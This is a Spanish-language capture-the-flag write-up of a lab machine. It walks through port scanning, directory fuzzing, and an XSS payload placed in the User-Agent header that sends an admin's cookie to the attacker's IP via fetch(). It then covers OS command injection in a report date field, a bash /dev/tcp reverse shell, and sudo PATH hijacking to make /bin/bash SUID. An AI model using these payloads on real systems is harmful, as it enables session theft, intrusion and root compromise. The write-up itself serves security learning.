

# PortScan
```bash
nmap -sCV -p22,5000 10.10.11.8
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-01 10:54 AST
Nmap scan report for 10.10.11.8
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sat, 01 Jun 2024 14:53:51 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2799
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Under Construction</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     background-color: #f7f7f7;
|     margin: 0;
|     padding: 0;
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     height: 100vh;
|     .container {
|     text-align: center;
|     background-color: #fff;
|     border-radius: 10px;
|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=6/1%Time=665B360F%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,BE1,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\x
SF:20Python/3\.11\.2\r\nDate:\x20Sat,\x2001\x20Jun\x202024\x2014:53:51\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x202799\r\nSet-Cookie:\x20is_admin=InVzZXIi\.uAlmXlTvm8vyihjNaPDWnvB_Zf
SF:s;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x
SF:20lang=\"en\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x
SF:20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>Under\x20Constructi
SF:on</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x20\x20\x20\x20bo
SF:dy\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x
SF:20'Arial',\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20background-color:\x20#f7f7f7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20dis
SF:play:\x20flex;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20justify
SF:-content:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20a
SF:lign-items:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0height:\x20100vh;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\.container\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20text-align:\x20center;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20background-color:\x20#fff;\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20border-radius:\x2010px;\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20box-shadow:\x200px\x200px\x2020px\x20rgba\(0,\x200
SF:,\x200,\x200\.2\);\n\x20\x20\x20\x20\x20")%r(RTSPRequest,16C,"<!DOCTYPE
SF:\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x2
SF:0\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x2
SF:0\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20respo
SF:nse</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\
SF:n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20versi
SF:on\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x2
SF:0unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Web Site


![[Pasted image 20240601105834.png]]


Vemos que el sitio está inactivo actualmente, y podemos hacer preguntas, en el siguiente apartado de soporte:

![[Pasted image 20240601105955.png]]

no le presto mucha atención de primera, así que se me ocurre ver qué directorios podemos descubrir mediante Fuzzing.

# Fuzzing

Usaré la herramienta **GoBuster** para buscar posibles directorios en el dominio.

```bash
gobuster dir -u http://10.10.11.8:5000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20

/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
```


el directorio soporte ya lo conocemos, qué es el que vimos para hacer pregunta, viendo el código de estado **500** en el "**/dashboard**", intuyo que tendremos que debemos loguearnos o arrastrar alguna cookie de sesión, y entrando definitivamente no veo nada ya que no estoy autorizado con mi cookie de sesión default, por lo que se me ocurre probar **XSS** en soporte.

# XXS

Comienzo viendo sí puedo llevar a cabo el **XXS** mediante un intento de obtener un recurso externo hosteado desde mi máquina, ya que al enviar los datos no representa nada en la pantalla de primeras, y hago esto para corroborar & ver sí es éxitoso.
![[Pasted image 20240601110702.png]]

El recurso "**test.js**" lo estaba hosteando desde mi máquina a través de python por el **:80**, pero al darle a "submit" reportó esto:
![[Pasted image 20240601110815.png]]
ha detectado el ataque, esto a qué aparentemente tiene **blacklist** para los intento de **XXS**, intenté bypassearla de varias maneras, usando hexadecimal, incluso de otras maneras contempladas en **HackTricks**, pero no logré nada éxitoso. PERO...

Si leemos el mensaje, dice que la IP se reportó a los administradores para la investigación del navegador, sabemos que el navegador corresponde al **"user-agent"** en las cabeceras de la solicitud, por ende se supone que los administradores verán eso, por lo que se me ocurre ahí cargar el payload para tratar de llevar a cabo el **XXS.**

Usaré **Burpsuite** como proxy para modificar la petición antes que llegue al servidor & manipular el **"user-agent"**, tal que así:
![[Pasted image 20240601111954.png]]
```bash
<script src="http://TU_IP/test"></script>
```

nos montamos un servidor en python aunque no exista el recurso, sólo para ver sí el payload y el recurso "**test**" lo están intentando cargar.
```bash
python3 -m http.server 80
```
![[Pasted image 20240601112013.png]]

Vemos que alguien está intentando cargar el recurso "**test**" de nuestra máquina, así que se me ocurre usar otro payload **XXS** para robarnos la cookie de sesión de quién intente obtener el recurso (quizás el admin).

![[Pasted image 20240601112326.png]]
```bash
<img src=x onerror=fetch('http://10.10.14.3/'+document.cookie);>
```

y nos reportaría la cookie de sesión en nuestro servidor Python.
![[Pasted image 20240601112933.png]]


copiamos esta cookie, abrimos nuestro navegador, y ponemos esta cookie de sesión. (De no saber hacerlo investigar como poner cookie de sesión en su navegador), en el caso de Firefox es así:

**CTRL + SHIF + C > Network**

y en "**value**" la ponemos.

![[Pasted image 20240601113202.png]]
Ahora intento ver sí tengo permisos para ver el directorio "**/dashboard**", y...
![[Pasted image 20240601113254.png]]

he logrado obtener una cookie válida para ver el **dashboard**, y vemos que podemos generar reportes, no veo nada interesante de primera, así que opto interceptar los reportes con **BurpSuite**.

Viendo la siguiente data en la petición:
![[Pasted image 20240601113658.png]]
intento probar inyecciones del sistema operativo, en este caso Linux.
![[Pasted image 20240601113757.png]]
y vualá, logro ver directorios & archivos de la aplicación web, así que ya que tengo un **RCE** procedemos a enviarme una **Reverse Shell,** ganando acceso a la máquina.

Nos ponemos en escucha en nuestra máquina local.
```bash
nc -nlvp PORT
```

Payload para la reverse shell en la **DATA**:
```bash
date=2023-09-15D;bash+-c+"bash+-i+>/dev/tcp/10.10.x.x/PORT+0>%261"
```

![[Pasted image 20240601114145.png]]

Ya tenemos la Reverse Shell, ya sólo quedaría darle tratamiento a la TTY, que sino sabes cómo mira este POST [((Click aquí))](https://4uli.github.io/tratamiento-tty/#)

# Escalada de Privilegios

como **dvir**, tenemos los siguiente permisos **SUDOERS**.
![[Pasted image 20240601114453.png]]
podemos ejecutar sin proporcionar contraseña el binario "**syscheck**", y como el usuario que queramos, por lo que indago en búsqueda de posibles escalada de privilegios para este binario, pero no está contemplado en **GTFobins**, así que indago en su código fuente...

![[Pasted image 20240601114634.png]]

veo que está ejecutando un script en **Bash** con su ruta relativa, por lo que podemos llevar a cabo un **Path Hijacking**, para crearnos un .**sh** con el mismo nombre, pero para hacer lo que nosotros queramos.

1. Vamos a un directorio con permiso de escritura y creamos el archivo.
```bash
cd /tmp
nano initdb.sh
``` 

dentro tendrá lo siguiente para darle permiso **SUID** a la bash, y poder ejecutarla como ROOT.
```bash
#/bin/bash
chmod u+s /bin/bash
```

2. Cambiamos la variable de entorno **PATH** para qué primero lea de nuestro initdb.sh, en vez del real.
```bash
export PATH=/tmp/:$PATH
```

3. Volvemos a ejecutar el "**syscheck**" como Root
```bash
sudo /usr/bin/syscheck
```

4. Ejecutamos la bash como Root.
```bash
bash -p
``` 

![[Pasted image 20240601115219.png]]